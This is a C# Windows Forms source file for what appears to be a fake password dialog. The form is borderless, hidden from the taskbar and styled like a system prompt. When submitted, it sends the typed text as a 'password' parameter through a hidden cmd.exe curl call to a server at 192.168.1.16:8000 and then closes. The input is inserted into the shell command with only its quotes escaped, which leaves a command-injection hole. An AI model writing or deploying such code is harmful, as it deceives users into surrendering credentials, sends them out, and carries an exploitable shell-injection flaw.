using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace WinFormsApp1
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
            this.ShowInTaskbar = false; 
            this.FormBorderStyle = FormBorderStyle.None;

            textBox1.BackColor = Color.FromArgb(240, 240, 240);
            textBox1.BorderStyle = BorderStyle.None;

            button1.FlatStyle = FlatStyle.Flat;
            button1.BackColor = Color.FromArgb(185, 185, 185);
            button1.FlatAppearance.BorderSize = 0;

            button2.FlatStyle = FlatStyle.Flat;
            button2.BackColor = Color.FromArgb(185, 185, 185);
            button2.FlatAppearance.BorderSize = 0;

            this.StartPosition = FormStartPosition.CenterScreen;

            textBox1.KeyDown += TextBox1_KeyDown;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1.PerformClick();
                e.SuppressKeyPress = true; 
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textBox1.Text))
            {
                return; 
            }

            ExecuteCurlCommand();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textBox1.Text))
            {
                return;
            }

            ExecuteCurlCommand();
        }

        private void ExecuteCurlCommand()
        {
            string data = textBox1.Text.Replace("\"", "\\\"");
            ExecuteCommand($"curl --verbose --get --data-urlencode \"password={data}\" http://192.168.1.16:8000");
            Application.Exit();
        }

        private void ExecuteCommand(string command)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/C " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }
    }
}
